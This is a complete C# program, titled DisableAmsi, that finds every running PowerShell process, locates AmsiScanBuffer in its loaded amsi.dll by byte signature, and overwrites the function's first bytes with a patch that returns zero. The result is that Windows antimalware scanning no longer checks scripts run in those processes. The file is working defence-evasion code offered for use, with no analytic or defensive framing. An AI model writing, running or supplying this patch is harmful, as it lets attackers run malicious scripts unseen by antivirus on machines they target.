using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace DisableAmsi
{
    class Program
    {
        const int PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        static void Main(string[] args)
        {
            try
            {
                ModifyFunction("amsi.dll", "AmsiOpenSession");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Unhandled exception: {ex}");
            }
        }

        static void ModifyFunction(string moduleName, string functionName)
        {
            foreach (Process process in Process.GetProcessesByName("powershell"))
            {
                IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, process.Id);
                if (processHandle == IntPtr.Zero)
                {
                    Console.WriteLine($"Failed to open process {process.Id}");
                    continue;
                }

                Console.WriteLine($"Got process handle of PID powershell at {process.Id}: {processHandle.ToString("X")}");
                Console.WriteLine($"Trying to find AmsiScanBuffer in {process.Id} process memory...");

                IntPtr amsiDllBaseAddress = GetAmsiDllBaseAddress(processHandle, process.Id);
                if (amsiDllBaseAddress == IntPtr.Zero)
                {
                    Console.WriteLine($"Error finding AmsiDllBaseAddress in {process.Id}. Error: {Marshal.GetLastWin32Error()}");
                    continue;
                }
                else
                {
                    Console.WriteLine($"Trying to patch AmsiScanBuffer found at {amsiDllBaseAddress.ToString("X")}");

                    if (!PatchAmsiScanBuffer(processHandle, amsiDllBaseAddress))
                    {
                        Console.WriteLine($"Error patching AmsiScanBuffer in {process.Id}. Error: {Marshal.GetLastWin32Error()}");
                        continue;
                    }
                    else
                    {
                        Console.WriteLine($"Success patching AmsiScanBuffer in PID {process.Id}");
                    }
                }

                CloseHandle(processHandle);
                Console.WriteLine("Closed process handle\n");
            }
        }

        static IntPtr GetAmsiDllBaseAddress(IntPtr processHandle, int pid)
        {
            foreach (ProcessModule module in Process.GetProcessById(pid).Modules)
            {
                if (module.ModuleName.Equals("amsi.dll", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine($"Found base address of {module.ModuleName}: {module.BaseAddress.ToString("X")}");
                    return GetAmsiScanBufferAddress(processHandle, module.BaseAddress);
                }
            }
            return IntPtr.Zero;
        }

        static IntPtr GetAmsiScanBufferAddress(IntPtr processHandle, IntPtr baseAddress)
        {
            byte[] amsiScanBuffer = new byte[]
            {
                0x4c, 0x8b, 0xdc,
                0x49, 0x89, 0x5b, 0x08,
                0x49, 0x89, 0x6b, 0x10,
                0x49, 0x89, 0x73, 0x18,
                0x57,
                0x41, 0x56,
                0x41, 0x57,
                0x48, 0x83, 0xec, 0x70
            };

            while (true)
            {
                byte[] buffer = new byte[amsiScanBuffer.Length];
                IntPtr bytesRead;

                if (!ReadProcessMemory(processHandle, baseAddress, buffer, (uint)buffer.Length, out bytesRead))
                {
                    break;
                }

                if (CompareByteArrays(buffer, amsiScanBuffer) || buffer[0] == 0x29 && buffer[1] == 0xc0 && buffer[2] == 0xc3)
                {
                    return baseAddress;
                }
                baseAddress += 1;
            }
            return IntPtr.Zero;
        }

        static bool PatchAmsiScanBuffer(IntPtr processHandle, IntPtr address)
        {
            byte[] patchPayload = new byte[]
            {
                0x29, 0xc0,  // xor eax,eax
                0xc3  // ret
            };

            uint oldProtection;
            if (!VirtualProtectEx(processHandle, address, (uint)patchPayload.Length, PAGE_EXECUTE_READWRITE, out oldProtection))
            {
                Console.WriteLine($"VirtualProtectEx Error: {Marshal.GetLastWin32Error()}");
                return false;
            }

            IntPtr bytesWritten;
            if (!WriteProcessMemory(processHandle, address, patchPayload, (uint)patchPayload.Length, out bytesWritten))
            {
                Console.WriteLine($"WriteProcessMemory Error: {Marshal.GetLastWin32Error()}");
                return false;
            }

            VirtualProtectEx(processHandle, address, (uint)patchPayload.Length, oldProtection, out oldProtection);
            return true;
        }

        static bool CompareByteArrays(byte[] array1, byte[] array2)
        {
            if (array1.Length != array2.Length)
            {
                return false;
            }

            for (int i = 0; i < array1.Length; i++)
            {
                if (array1[i] != array2[i])
                {
                    return false;
                }
            }

            return true;
        }
    }
}
